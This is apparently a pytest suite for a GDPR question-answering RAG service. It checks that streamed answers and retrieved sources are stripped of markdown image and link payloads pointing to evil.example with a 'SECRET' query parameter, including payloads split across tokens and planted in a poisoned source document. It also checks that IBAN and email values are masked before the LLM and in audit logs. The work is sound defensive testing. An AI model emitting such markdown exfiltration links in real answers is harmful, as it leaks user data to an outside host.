import json
import logging

import pytest
from fastapi.testclient import TestClient

from app.api import main
from app.providers.base import Chunk, RetrievedChunk
from app.rag.agent import Agent
from app.rag.pipeline import RAGPipeline
from app.rag.retrieval import RetrievalConfig, Retriever
from app.rag.router import PipelineRunner, Router

IBAN = "DE89 3704 0044 0532 0130 00"


def make_chunk(text):
    meta = {"source": "gdpr", "section": "Article 33", "title": "t", "chapter": "", "part": 0}
    return Chunk("gdpr:Article 33:0", "gdpr", text, meta)


class Embedder:
    def embed(self, texts):
        return [[1.0] for _ in texts]


class Store:
    def __init__(self, text):
        self.chunks = [make_chunk(text)]

    def all_chunks(self):
        return self.chunks

    def search(self, emb, k, filters=None):
        return [RetrievedChunk(c, 1.0) for c in self.chunks][:k]


class RecordingLLM:
    """Streams a malicious answer split at awkward places and records the prompts it was given."""

    def __init__(self, pieces):
        self.pieces, self.prompts, self.turn = pieces, [], 0

    async def generate(self, system, user):
        return "lookup"

    async def stream(self, system, user):
        self.prompts.append(user)
        for piece in self.pieces:
            yield piece

    async def chat(self, messages, tools=None):
        self.prompts.append(messages[-1]["content"])
        return {
            "content": "Agent: see [docs](https://evil.example/?d=1) ![i](https://evil.example/i)"
        }


@pytest.fixture
def client(monkeypatch):
    def make(pieces, source_text="Plain regulation text."):
        llm = RecordingLLM(pieces)
        retriever = Retriever(Embedder(), Store(source_text), RetrievalConfig(hybrid=True))
        baseline = RAGPipeline(retriever, llm)
        services = main.Services(
            baseline,
            Router(llm, {"baseline": PipelineRunner(baseline, 7)}),
            agent=Agent(llm, retriever),
        )
        monkeypatch.setattr(main, "build_services", lambda: services)
        return TestClient(main.app), llm

    return make


def events(resp):
    out = []
    for block in resp.text.strip().split("\n\n"):
        name, data = block.split("\n")
        out.append((name.removeprefix("event: "), json.loads(data.removeprefix("data: "))))
    return out


def ask(c, question, mode="baseline"):
    return events(c.post("/chat", json={"question": question, "mode": mode}))


def tokens(evts):
    return "".join(d for n, d in evts if n == "token")


def test_malicious_markdown_split_across_tokens_never_reaches_the_client(client):
    pieces = [
        "Notify in 72 hours [1]. ![sta",
        "tus](https://evil.",
        "example/?d=SECRET) and [more](http",
        "s://evil.example/x) done",
    ]
    c, _ = client(pieces)
    with c:
        text = tokens(ask(c, "deadline?"))
    assert "evil.example" not in text and "SECRET" not in text
    assert "Notify in 72 hours [1]." in text and "more" in text and "done" in text


def test_agent_answers_are_sanitised_too(client):
    c, _ = client(["unused"])
    with c:
        text = tokens(ask(c, "compare?", mode="agent"))
    assert "evil.example" not in text and "docs" in text


def test_source_text_shown_to_the_user_is_sanitised(client):
    poisoned = "Article text. ![x](https://evil.example/?d=1) More text."
    c, _ = client(["ok"], source_text=poisoned)
    with c:
        evts = ask(c, "deadline?")
    shown = [s["text"] for n, d in evts if n == "sources" for s in d]
    assert shown and all("evil.example" not in t for t in shown)
    assert "Article text." in shown[0] and "More text." in shown[0]


def test_pii_is_masked_before_the_llm_and_the_user_is_told(client):
    c, llm = client(["ok"])
    with c:
        evts = ask(c, f"Our client's IBAN {IBAN} leaked, what must we do?")
    assert llm.prompts and all("DE89" not in p for p in llm.prompts)
    assert any("[IBAN]" in p for p in llm.prompts)
    notice = [d for n, d in evts if n == "notice"]
    assert notice and "IBAN x1" in notice[0]["message"] and "DE89" not in notice[0]["message"]


def test_audit_log_counts_masked_pii_without_the_values(client, caplog):
    c, _ = client(["ok"])
    with caplog.at_level(logging.INFO, logger="audit"):
        with c:
            ask(c, f"mail me at jane@corp.example about {IBAN}")
    entry = json.loads(caplog.records[-1].getMessage())
    assert entry["pii_masked"] == {"EMAIL": 1, "IBAN": 1}
    text = "\n".join(r.getMessage() for r in caplog.records)
    assert "jane@corp" not in text and "DE89" not in text


def test_questions_without_personal_data_get_no_notice(client):
    c, _ = client(["ok"])
    with c:
        evts = ask(c, "What does Article 33 of Regulation (EU) 2016/679 require within 72 hours?")
    assert not any(n == "notice" for n, _ in evts)
